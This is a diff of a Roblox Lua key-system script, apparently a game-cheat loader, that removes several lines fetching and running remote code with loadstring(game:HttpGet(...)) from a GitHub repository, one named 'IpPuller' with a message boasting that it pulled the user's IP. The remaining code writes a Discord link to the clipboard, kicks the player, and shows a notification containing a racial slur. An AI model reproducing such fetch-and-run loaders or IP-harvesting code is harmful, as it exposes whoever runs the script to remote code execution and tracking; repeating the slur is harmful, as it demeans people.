@@ -151,9 +151,9 @@ else
     		key.Text = ""
     		key.Text = "Incorrect, try again."
     		wait(2)
+    		setclipboard("https://discord.gg/ja5g4ym7WB")
     		game:GetService("Players").LocalPlayer:Kick("Join discord to get key, link was copied to your clipboard!")
-		setclipboard("https://discord.gg/ja5g4ym7WB")
-		wait(1)
+    		wait(1)
     		key.Text = ""
     	end
     end)    
@@ -213,17 +213,15 @@ else
         game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "Lol nigga code by fishaok#1151"})
     	print"loaded text"
     
-    
+
+
     local function OHWDD_fake_script()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/IpPuller"))()
-    print" we pulled your ip loaded ip puller"
+    wait(0)
+    print"Okay can we Stop"
     end
     coroutine.wrap(OHWDD_fake_script)()
-    
+
     local SuperWheat = Instance.new("BoolValue")
     SuperWheat.Name = "ncca"
     SuperWheat.Parent = game.Players.LocalPlayer
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/Version"))()
-wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/kickmsglog"))()
